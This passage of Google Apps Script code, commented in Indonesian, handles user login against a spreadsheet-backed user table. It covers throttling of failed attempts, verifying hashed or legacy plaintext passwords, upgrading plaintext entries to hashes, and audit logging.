 * Aman dijalankan berulang: kalau nilai sudah berformat hash, tidak melakukan
 * apa-apa. Gagal tanpa menggagalkan login — dual-read tetap menerima plaintext.
 */
function upgradeHashPw_(username, passwordPlain) {
  try {
    var sh = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName("db_Users");
    if (!sh) return false;

    var kolomPw = typeof COL_USERS !== "undefined" && COL_USERS ? COL_USERS.password : 3;
    var kolomNama = typeof COL_USERS !== "undefined" && COL_USERS ? COL_USERS.userName : 2;
    var target = String(username || "").trim().toLowerCase();

    var data = sh.getDataRange().getValues();
    for (var i = 1; i < data.length; i++) {
      if (String(data[i][kolomNama] || "").trim().toLowerCase() !== target) continue;
      if (!_pwPerluUpgrade_(data[i][kolomPw])) return false;
      _tulisHashPw_(sh, i + 1, passwordPlain);
      if (typeof _bustUsersCache_ === "function") _bustUsersCache_();
      audit_(null, "PW_UPGRADE", target, "OK", "plaintext -> hash");
      return true;
    }
    return false;
  } catch (e) {
    try {
      Logger.log("upgradeHashPw_ gagal: " + e.message);
    } catch (e2) {}
    return false;
  }
}

/**
 * Pemeriksaan login terpadu: cek kunci throttle, verifikasi password
 * (dual-read hash/plaintext), catat gagal/berhasil, dan upgrade hash bila perlu.
 *
 * Dipanggil doLogin() dan loginPerangkat() supaya kebijakan throttle dan hash
 * tidak perlu ditulis dua kali.
 *
 * @return {Object} { boleh, pesan, gagalKe, tersimpan }
 *         boleh=false bila terkunci atau password salah (pesan siap dikirim
 *         ke klien — sengaja tidak membedakan "terkunci" dan "salah" secara
 *         berlebihan, tetapi tidak membocorkan apakah username ada).
 */
function verifikasiLogin_(username, password) {
  var nama = String(username == null ? "" : username).trim();
  var kunci = loginThrottleCek_(nama);
  if (!kunci.boleh) {
    audit_(null, "LOGIN", nama, "TOLAK", "terkunci " + kunci.sisaDetik + " detik");
    return {
      boleh: false,
      pesan:
        "Terlalu banyak percobaan gagal. Coba lagi dalam " +
        Math.max(1, Math.ceil(kunci.sisaDetik / 60)) +
        " menit.",
      terkunci: true,
    };
  }

  var tersimpan = cariPasswordTersimpan_(nama);
  if (tersimpan.ditemukan && _verifyPw_(tersimpan.nilai, password)) {
    loginThrottleReset_(nama);
    if (_pwPerluUpgrade_(tersimpan.nilai)) upgradeHashPw_(nama, password);
    return { boleh: true, tersimpan: tersimpan };
  }

  var g = loginThrottleGagal_(nama);
  return {
    boleh: false,
    pesan: "Username atau password salah.",
    tersimpan: tersimpan,
    gagalKe: g.gagal,
  };
}

/**
 * Ambil nilai kolom Password untuk satu username, langsung dari sheet.
 * Sengaja tidak melewati cache db_Users supaya hasil verifikasi selalu segar
 * (cache itu untuk mempercepat login, bukan untuk sumber kebenaran sandi).
 *
 * @return {Object} { ditemukan, nilai, baris }
 */
function cariPasswordTersimpan_(username) {
  var target = String(username == null ? "" : username).trim().toLowerCase();
  var kolomPw = typeof COL_USERS !== "undefined" && COL_USERS ? COL_USERS.password : 3;
  var kolomNama = typeof COL_USERS !== "undefined" && COL_USERS ? COL_USERS.userName : 2;

  if (!target) return { ditemukan: false, nilai: "", baris: -1 };
  if (typeof _usersRowsCache_ === "function") {
    var data = _usersRowsCache_();
    if (data && data.length) {
      for (var i = 1; i < data.length; i++) {
        if (String(data[i][kolomNama] || "").trim().toLowerCase() === target) {
          return { ditemukan: true, nilai: String(data[i][kolomPw] || "").trim(), baris: i + 1 };
        }
      }
      return { ditemukan: false, nilai: "", baris: -1 };
    }
  }
  var sh = SpreadsheetApp.openById(SPREADSHEET_ID).getSheetByName("db_Users");
  if (!sh) return { ditemukan: false, nilai: "", baris: -1 };
  var rows = sh.getDataRange().getValues();
  for (var j = 1; j < rows.length; j++) {
    if (String(rows[j][kolomNama] || "").trim().toLowerCase() === target) {
      return { ditemukan: true, nilai: String(rows[j][kolomPw] || "").trim(), baris: j + 1 };
    }
  }
  return { ditemukan: false, nilai: "", baris: -1 };
}
